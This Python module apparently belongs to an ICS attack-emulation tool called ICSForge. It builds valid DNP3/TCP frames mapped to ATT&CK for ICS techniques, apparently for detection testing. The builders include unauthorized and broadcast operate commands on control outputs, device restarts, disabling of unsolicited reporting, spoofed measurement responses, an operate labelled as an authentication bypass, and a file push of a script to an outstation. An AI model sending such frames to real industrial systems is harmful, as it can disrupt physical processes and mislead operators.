# ICSForge DNP3 payload builder — upgraded for ATT&CK for ICS realism
# Implements real DNP3/TCP link+transport+application layer framing
# CRC-16/DNP computed per IEEE 1815 / IEC 62351-5
import random
import struct

from .covert_marker import explicit_marker

# ── DNP3 CRC-16 lookup table (polynomial 0x3D65, bit-reversed) ───────
# Ref: IEEE 1815-2012 Annex E, identical to IEC 62351-5
_CRC_TABLE = [0] * 256

def _build_crc_table():
    poly = 0xA6BC  # reversed 0x3D65
    for i in range(256):
        crc = i
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ poly
            else:
                crc >>= 1
        _CRC_TABLE[i] = crc & 0xFFFF

_build_crc_table()


def dnp3_crc(data: bytes) -> int:
    """Compute DNP3 CRC-16 over *data* (returns 16-bit int, little-endian on wire)."""
    crc = 0x0000
    for b in data:
        crc = (_CRC_TABLE[(crc ^ b) & 0xFF] ^ (crc >> 8)) & 0xFFFF
    return (~crc) & 0xFFFF

# Application Function Codes (IEC 60870-5 / IEEE 1815)
FC = {
    "confirm":             0x00,
    "read":                0x01,
    "write":               0x02,
    "select":              0x03,
    "operate":             0x04,
    "direct_operate":      0x05,
    "direct_operate_nr":   0x06,  # no-ack
    "cold_restart":        0x0D,
    "warm_restart":        0x0E,
    "enable_unsolicited":  0x14,
    "disable_unsolicited": 0x15,
    "assign_class":        0x16,
    "delay_measure":       0x17,
    "open_file":           0x19,
    "authenticate_req":    0x20,
    "response":            0x81,
    "unsolicited":         0x82,
}

# Group/Variation for objects (Group, Variation)
OBJ = {
    "binary_input":     (1,  2),   # Binary Input with flags
    "binary_output":    (10, 2),   # Binary Output with flags
    "analog_input":     (30, 1),   # 32-bit with flags
    "analog_output":    (40, 1),   # 32-bit with flags
    "counter":          (20, 1),   # 32-bit counter
    "class0":           (60, 1),   # Class 0 data
    "class1":           (60, 2),   # Class 1 data
    "class2":           (60, 3),   # Class 2 data
    "class3":           (60, 4),   # Class 3 data
    "time":             (50, 1),   # Time and date
    "iin":              (80, 1),   # Internal Indications
}



def _data_blocks(payload: bytes) -> bytes:
    """Split payload into 16-byte blocks each followed by a 2-byte CRC.

    Per IEEE 1815-2012 §8.2: the data portion of a DNP3 frame consists of
    one or more user data blocks. Each block is up to 16 bytes of data
    followed by a 2-byte CRC computed over that block. The link layer
    Length field counts 5 (fixed header fields) + all data-block bytes
    (i.e. including the per-block CRC bytes, but excluding the start
    octets 0x05 0x64 and the header CRC).
    """
    blocks = b""
    i = 0
    while i < len(payload):
        block = payload[i : i + 16]
        blocks += block + struct.pack("<H", dnp3_crc(block))
        i += 16
    return blocks

def _link_header(dest: int, src: int, user_data_len: int) -> bytes:
    """DNP3 link layer header (10 bytes) with valid CRC-16.

    Format: 0x0564 | length | ctrl | dest(LE) | src(LE) | CRC(LE)
    The CRC covers bytes 0-7 (start, length, ctrl, dest, src).

    Per IEEE 1815-2012 §9.2.4.1.2, the Length octet counts the octets in
    the link-layer frame that follow the Length octet itself, EXCLUDING
    the per-data-block (chunk) CRC octets:
        Length = 1 (ctrl) + 2 (dest) + 2 (src) + N user-data octets
               = 5 + user_data_len
    The per-block 16-bit CRCs are NOT counted (a spec-compliant parser
    derives the CRC octet count from the user-data length). Passing the
    CRC-inclusive block length here was a bug: it inflated Length so
    dissectors and real outstations miscounted the final data block and
    rejected every per-block CRC after the first — which meant the DNP3
    application layer never parsed.
    """
    ctrl = 0xC4  # PRM=1, FCB=0, FCV=0, FC=4 (USER_DATA_NO_ACK)
    length = 5 + user_data_len
    length = max(5, min(255, length))
    hdr_body = struct.pack("<BBBBHH", 0x05, 0x64, length, ctrl, dest & 0xFFFF, src & 0xFFFF)
    crc = dnp3_crc(hdr_body)
    return hdr_body + struct.pack("<H", crc)


def _app_layer(fc_byte: int, obj_group: int = 60, obj_var: int = 1,
               count: int = 0, extra: bytes = b"", seq: int | None = None,
               point_data: bytes = b"", qualifier: int | None = None) -> bytes:
    """Build transport+application layer bytes.

    seq: application-layer sequence number (0-15). If None, a random value
         is used so successive packets in a scenario look like a real session.

    Object encoding follows IEEE 1815-2012 §4.4 / Table 4-4 (qualifier codes):

      * READ requests reference objects by RANGE without carrying point data.
        Class polls (group 60) and "all points" reads use qualifier 0x06
        ("all objects / no range field"). Point-range reads use qualifier 0x00
        ("8-bit start/stop index range"). Neither is followed by point data.

      * WRITE / OPERATE / RESPONSE messages CARRY point objects: qualifier
        0x17 ("8-bit count + 8-bit index prefix") followed by, for each point,
        a 1-byte index prefix and the variation's data bytes (supplied by the
        caller as ``point_data``). Supplying a count with no matching point
        data — the previous behaviour — makes a conformant dissector read the
        following bytes (e.g. the correlation marker) as object data and flag
        the frame malformed.

    qualifier: override the auto-selected qualifier code when a style needs a
        specific one. When None, it is derived from the function code and
        whether point_data is present.
    """
    import random as _r
    _seq = (seq if seq is not None else _r.randint(0, 15)) & 0x0F
    transport = bytes([0xC0 | _seq])  # FIR=1 FIN=1 SEQ=random
    # Application control: FIR=1 FIN=1 CON=0 SEQ. Per IEEE 1815-2012 §4.3.2.2
    # the UNS (unsolicited) bit MUST be set for an Unsolicited Response
    # (function 0x82) and clear otherwise — a real master/outstation keys on
    # this bit to route the message. Setting it makes spoofed unsolicited
    # reporting traffic (T0856) faithful instead of looking like a request.
    _UNS = 0x10 if fc_byte == 0x82 else 0x00
    app_ctrl  = bytes([0xC0 | _UNS | _seq])
    func      = bytes([fc_byte])
    # DNP3 responses (FC 0x81 Response, 0x82 Unsolicited Response, 0x83 Auth
    # Response) carry a mandatory 2-byte Internal Indications (IIN) field
    # immediately after the function code, before any object data
    # (IEEE 1815-2012 §4.3.2.2 / §11.7). Requests have no IIN.
    _iin = struct.pack("<H", 0x0000) if fc_byte >= 0x81 else b""

    _is_read = (fc_byte == 0x01)

    if count > 0 and obj_group:
        if _is_read:
            # READ: reference by range, no point data follows.
            if obj_group == 60:
                # Class objects: qualifier 0x06 = all objects, no range field.
                obj_hdr = struct.pack("BBB", obj_group & 0xFF, obj_var & 0xFF,
                                      qualifier if qualifier is not None else 0x06)
            else:
                # Point read: qualifier 0x00 = 8-bit start/stop index range,
                # requesting indices 0..count-1. No point data follows.
                q = qualifier if qualifier is not None else 0x00
                obj_hdr = struct.pack("BBBBB", obj_group & 0xFF, obj_var & 0xFF,
                                      q, 0x00, max(0, count - 1) & 0xFF)
            app_body = app_ctrl + func + _iin + obj_hdr + extra
        elif point_data:
            # WRITE / OPERATE / RESPONSE carrying real point objects.
            # Qualifier 0x17 = 8-bit count followed by 8-bit index prefix per
            # point. The caller-supplied point_data already includes the index
            # prefix(es) + variation bytes for `count` points.
            q = qualifier if qualifier is not None else 0x17
            obj_hdr = struct.pack("BBBB", obj_group & 0xFF, obj_var & 0xFF, q, count & 0xFF)
            app_body = app_ctrl + func + _iin + obj_hdr + point_data + extra
        else:
            # No explicit point data supplied for a non-read: fall back to a
            # range reference (qualifier 0x06) so the object is self-consistent
            # and the dissector does not consume trailing bytes as point data.
            obj_hdr = struct.pack("BBB", obj_group & 0xFF, obj_var & 0xFF,
                                  qualifier if qualifier is not None else 0x06)
            app_body = app_ctrl + func + _iin + obj_hdr + extra
    else:
        app_body = app_ctrl + func + _iin + extra
    return transport + app_body


# CROB status octet codes per IEEE 1815-2012 §A.21.3 ("ControlStatus").
# Realistic distribution: real PLCs respond to operate commands with SUCCESS in
# the vast majority of cases, occasionally with non-success codes when the
# command violates a safety / configuration constraint. We bias accordingly.
_DNP3_CROB_STATUS_DISTRIBUTION = (
    # (code, weight)
    (0x00, 88),   # SUCCESS — dominant in real traffic
    (0x01,  3),   # TIMEOUT
    (0x02,  2),   # NO_SELECT — operate without prior select-before-operate
    (0x04,  2),   # NOT_SUPPORTED
    (0x05,  1),   # ALREADY_ACTIVE
    (0x06,  1),   # HARDWARE_ERROR
    (0x09,  1),   # NOT_AUTHORIZED — common in attack scenarios
    (0x0A,  1),   # AUTOMATION_INHIBIT — safety lockout active
    (0x0C,  1),   # OUT_OF_RANGE
)
_DNP3_CROB_STATUS_CODES, _DNP3_CROB_STATUS_WEIGHTS = zip(*_DNP3_CROB_STATUS_DISTRIBUTION, strict=True)


def _dnp3_crob_status(rnd: random.Random) -> int:
    """Pick a CROB status octet from the IEEE 1815-2012 §A.21.3 distribution."""
    return rnd.choices(_DNP3_CROB_STATUS_CODES, weights=_DNP3_CROB_STATUS_WEIGHTS, k=1)[0]


def build_payload(marker: str, style: str = "read", **kwargs) -> bytes:
    """
    Build DNP3/TCP frame.

    Styles:
      read                 FC01 class0 — T0801 Monitor Process State
      read_class1          FC01 class1 — T0802 Automated Collection
      write                FC02 — T0855 Unauthorized Command
      select               FC03 — T0855 pre-operate (select phase)
      operate              FC04 — T0855 Unauthorized Command (operate phase)
      direct_operate       FC05 — T0855/T0831 without select
      direct_operate_nr    FC06 — T0855 no-ack (evasion variant)
      cold_restart         FC0D — T0816 Device Restart
      warm_restart         FC0E — T0816 Device Restart (warm)
      enable_unsolicited   FC14 — T0849/T0856 Spoof Reporting
      disable_unsolicited  FC15 — T0815 Denial of View
      assign_class         FC16 — T0841 reconfiguration sweep
      delay_measure        FC17 — T0841 timing/network probe
      read_analog          FC01 analog — T0801 process monitoring
      read_counter         FC01 counters — T0882 Theft of Operational Info
      authenticate_req     FC20 — T0858 Change Credential
    """
    rnd  = random.Random(kwargs.get("seed"))
    dest = int(kwargs.get("dnp3_dest", rnd.randint(1, 10)))   & 0xFFFF
    src  = int(kwargs.get("dnp3_src",  rnd.randint(1024, 65000))) & 0xFFFF
    _mode = kwargs.get("marker_mode", "covert" if marker else "none")
    _run = kwargs.get("run_marker", "offline")
    # DNP3 has only ~8 genuinely-free bits (the 4-bit app sequence), too thin
    # for a robust covert field. It therefore uses the compact 13-byte explicit
    # marker ('ICSF' + proto code + 8 hex of run hash) in BOTH covert and
    # explicit modes — it fits inside a single 16-byte transport chunk so the
    # IEEE 1815-2012 §10.3.1 CRC interrupts don't bisect it, and the receiver
    # verifies it via the run hash. no_marker mode appends nothing.
    #
    # The marker is wrapped as a DNP3 Group 110 (octet string) object so a
    # dissector parses it as a *valid* object rather than mis-reading the raw
    # bytes as an "Unknown Object\Variation" (the phantom-object artifact that
    # appeared when the bare marker trailed real object data). Group 110
    # variation N = an N-byte octet string; qualifier 0x00 with range (0,0)
    # carries a single string at index 0. This keeps response/request frames
    # cleanly dissectable end-to-end for NSM tooling.
    if _mode == "none" or not marker:
        mb = b""
    else:
        _raw_marker = explicit_marker(_run, "dnp3")
        _n = len(_raw_marker) & 0xFF
        mb = struct.pack("BBBBB", 110, _n, 0x00, 0x00, 0x00) + _raw_marker
    # Monotonic app-layer sequence from engine; None → random per packet
    _dnp3_seq: int | None = (int(kwargs.get("dnp3_seq")) & 0x0F) if kwargs.get("dnp3_seq") is not None else None

    if style == "read":
        # Read all class 0 data
        app = _app_layer(FC["read"], obj_group=60, obj_var=1, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "read_class1":
        app = _app_layer(FC["read"], obj_group=60, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "read_analog":
        app = _app_layer(FC["read"], obj_group=30, obj_var=1, count=rnd.randint(1,8), extra=mb)

    elif style == "read_counter":
        app = _app_layer(FC["read"], obj_group=20, obj_var=1, count=rnd.randint(1,4), extra=mb)

    elif style == "write":
        # Write Binary Output Status (Group 10 Var 2) — T0831/T0855 style command.
        # Each point is a 1-byte status octet: bit7=ONLINE, bit0=state. Supply
        # `count` real point-status bytes (0x81 = ONLINE + state ON) so the
        # object is self-describing; qualifier 0x17 prefixes each with an index.
        _n = rnd.randint(1, 4)
        _pts = b"".join(bytes([i & 0xFF, 0x81]) for i in range(_n))  # idx prefix + status
        app = _app_layer(FC["write"], obj_group=10, obj_var=2, count=_n,
                         point_data=_pts, extra=mb)

    elif style == "select":
        # Select before operate: Group 12 Var 1 (CROB — 11 bytes per IEEE 1815-2012 §11.3.5.2)
        # control_code(1) + count(1) + on_time(4) + off_time(4) + status(1) = 11 bytes
        # Status octet realism: SUCCESS dominates (real PLCs almost always succeed),
        # but spec allows non-success codes. Per IEEE 1815-2012 §A.21.3:
        #   0x00 SUCCESS, 0x01 TIMEOUT, 0x02 NO_SELECT, 0x03 FORMAT_ERROR,
        #   0x04 NOT_SUPPORTED, 0x05 ALREADY_ACTIVE, 0x06 HARDWARE_ERROR,
        #   0x07 LOCAL, 0x08 TOO_MANY_OPS, 0x09 NOT_AUTHORIZED,
        #   0x0A AUTOMATION_INHIBIT, 0x0B PROCESSING_LIMITED, 0x0C OUT_OF_RANGE
        crob = bytes([0x03, 0x01]) + struct.pack('<II', 200, 0) + bytes([_dnp3_crob_status(rnd)])  # PULSE_ON, on=200ms, off=0
        app  = _app_layer(FC["select"], obj_group=12, obj_var=1, count=1,
                          point_data=bytes([0x00]) + crob, extra=mb, seq=_dnp3_seq)

    elif style == "operate":
        # CROB g12v1 (11 bytes): PULSE_ON, count=1, on=200ms, off=0, status varies per IEEE 1815-2012 §A.21.3
        crob = bytes([0x03, 0x01]) + struct.pack('<II', 200, 0) + bytes([_dnp3_crob_status(rnd)])
        app  = _app_layer(FC["operate"], obj_group=12, obj_var=1, count=1,
                          point_data=bytes([0x00]) + crob, extra=mb, seq=_dnp3_seq)

    elif style == "direct_operate":
        # CROB g12v1 (11 bytes): LATCH_ON, count=1, on=200ms, off=0, status varies per IEEE 1815-2012 §A.21.3
        crob = bytes([0x41, 0x01]) + struct.pack('<II', 200, 0) + bytes([_dnp3_crob_status(rnd)])
        app  = _app_layer(FC["direct_operate"], obj_group=12, obj_var=1, count=1,
                          point_data=bytes([0x00]) + crob, extra=mb, seq=_dnp3_seq)

    elif style == "direct_operate_nr":
        # CROB g12v1 (11 bytes): LATCH_ON, count=1, on=200ms, off=0, status varies per IEEE 1815-2012 §A.21.3
        crob = bytes([0x41, 0x01]) + struct.pack('<II', 200, 0) + bytes([_dnp3_crob_status(rnd)])
        app  = _app_layer(FC["direct_operate_nr"], obj_group=12, obj_var=1, count=1,
                          point_data=bytes([0x00]) + crob, extra=mb, seq=_dnp3_seq)

    elif style == "cold_restart":
        app = _app_layer(FC["cold_restart"], extra=mb, seq=_dnp3_seq)

    elif style == "warm_restart":
        app = _app_layer(FC["warm_restart"], extra=mb, seq=_dnp3_seq)

    elif style == "enable_unsolicited":
        app = _app_layer(FC["enable_unsolicited"], obj_group=60, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "disable_unsolicited":
        app = _app_layer(FC["disable_unsolicited"], obj_group=60, obj_var=2, count=1, extra=mb, seq=_dnp3_seq)

    elif style == "assign_class":
        app = _app_layer(FC["assign_class"], obj_group=1, obj_var=0, count=0, extra=mb, seq=_dnp3_seq)

    elif style == "delay_measure":
        app = _app_layer(FC["delay_measure"], extra=mb, seq=_dnp3_seq)

    elif style == "authenticate_req":
        # DNP3 Secure Authentication challenge — Group 120 Variation 1
        # (Authentication Challenge object), T0858/T0892 credential operations.
        # g120v1 is variable-length, so it uses free-format qualifier 0x5B
        # (1-byte count, then a 2-byte length, then the object body). Body per
        # IEEE 1815-2012 §A.39.1: challenge sequence number (u32), user number
        # (u16), HMAC/MAC algorithm (u8), reason (u8), then the challenge data.
        _csq  = struct.pack("<I", rnd.randint(1, 0xFFFF))   # challenge seq number
        _usr  = struct.pack("<H", 1)                         # user number
        chal_body = _csq + _usr + bytes([0x04, 0x01]) + (b"\x00" * 4)  # MAC alg=4, reason=1, 4-byte challenge
        obj = (struct.pack("BBB", 120, 1, 0x5B) + bytes([1])
               + struct.pack("<H", len(chal_body)) + chal_body)
        app = _app_layer(FC["authenticate_req"], extra=obj + mb, seq=_dnp3_seq)

    elif style == "clear_events":
        # FC02 Write to event log object to clear — T0872 Indicator Removal on Host
        # Write to class 0 data (G60V1) with count=0 to reset event buffer
        app = _app_layer(FC["write"], obj_group=60, obj_var=1, count=0, extra=mb, seq=_dnp3_seq)

    elif style == "broadcast_operate":
        # Direct operate to broadcast address — T0855/T0803 Block Command / Unauthorized Command
        # DNP3 broadcast (dest=0xFFFF) operates all outstation outputs simultaneously.
        # Group 10 Var 2 Binary Output Status: 1 status byte per point (0x81 =
        # ONLINE + state ON), index-prefixed via qualifier 0x17.
        dest = 0xFFFF  # override destination to broadcast
        app  = _app_layer(FC["direct_operate"], obj_group=10, obj_var=2, count=1,
                          point_data=bytes([0x00, 0x81]), extra=mb, seq=_dnp3_seq)
        blocks = _data_blocks(app)
        lhdr = _link_header(dest, src, len(app))
        return lhdr + blocks

    elif style == "file_open":
        # FC open_file (0x19) — T0807 Command-Line Interface (file ops on outstation).
        # DNP3 file transfer can push scripts to an outstation filesystem. Per
        # IEEE 1815-2012 §A.27.3 the request carries a Group 70 Variation 3
        # "File-Control – File Command" object, encoded with the free-format
        # qualifier 0x5B (1-byte count of 1, then a 2-byte free-format length
        # followed by that many object bytes). The file-command record is:
        #   filename offset (u16) | filename size (u16) | time of creation (u48)
        #   | permissions (u16) | auth key (u32) | file size (u32)
        #   | operational mode (u16) | max block size (u16)
        #   | request ID (u16) | filename (UTF-8, `filename size` bytes)
        fn = b"payload.sh"
        rec = (struct.pack("<H", 26)            # filename offset = fixed header size
               + struct.pack("<H", len(fn))     # filename size
               + b"\x00\x00\x00\x00\x00\x00"    # creation time (u48) = 0
               + struct.pack("<H", 0o600)        # permissions
               + struct.pack("<I", 0)            # authentication key
               + struct.pack("<I", 64)           # file size
               + struct.pack("<H", 0x0002)       # operational mode = WRITE
               + struct.pack("<H", 1024)         # max block size
               + struct.pack("<H", rnd.randint(1, 0xFFFF))  # request id
               + fn)
        # Object header: group 70, var 3, qualifier 0x5B (free-format, 1-byte
        # count), count = 1, then 2-byte free-format length, then the record.
        obj = (struct.pack("BBB", 70, 3, 0x5B) + bytes([1])
               + struct.pack("<H", len(rec)) + rec)
        app = _app_layer(FC["open_file"], extra=obj + mb, seq=_dnp3_seq)

    elif style == "warm_restart2":
        # FC warm_restart — T0858 Change Operating Mode (restart into alternate mode)
        app = _app_layer(FC["warm_restart"], extra=mb, seq=_dnp3_seq)

    elif style == "spoof_response":
        # DNP3 Unsolicited Response with injected analog data — T0856 Spoof
        # Reporting Message. The attacker spoofs an outstation reporting a false
        # measurement. Per IEEE 1815-2012 the response is FC 0x82 (UNS bit set,
        # IIN field — both handled in _app_layer), and Group 30 Variation 1 is
        # "32-bit Analog Input WITH flag": each point is a 1-byte flag (0x01 =
        # ONLINE) followed by a 32-bit signed value. The point data MUST follow
        # the object header directly so the dissector can parse it; the
        # correlation marker trails the complete object.
        _flag = bytes([0x01])  # ONLINE quality flag
        _val  = struct.pack("<i", kwargs.get("value", rnd.randint(5000, 9999)))
        app = _app_layer(FC["unsolicited"], obj_group=30, obj_var=1, count=1,
                         point_data=bytes([0x00]) + _flag + _val, extra=mb)

    elif style == "default_auth_bypass":
        # FC direct_operate without authentication — T0812 Default Credentials
        # DNP3 SAv5 bypass: operate without completing challenge-response.
        # Group 10 Var 2 Binary Output Status, 1 status byte, index-prefixed.
        app = _app_layer(FC["direct_operate"], obj_group=10, obj_var=2, count=1,
                         point_data=bytes([0x00, 0x81]), extra=mb, seq=_dnp3_seq)

    else:
        app = _app_layer(FC["read"], obj_group=60, obj_var=1, count=1, extra=mb, seq=_dnp3_seq)

    blocks = _data_blocks(app)
    lhdr = _link_header(dest, src, len(app))
    return lhdr + blocks
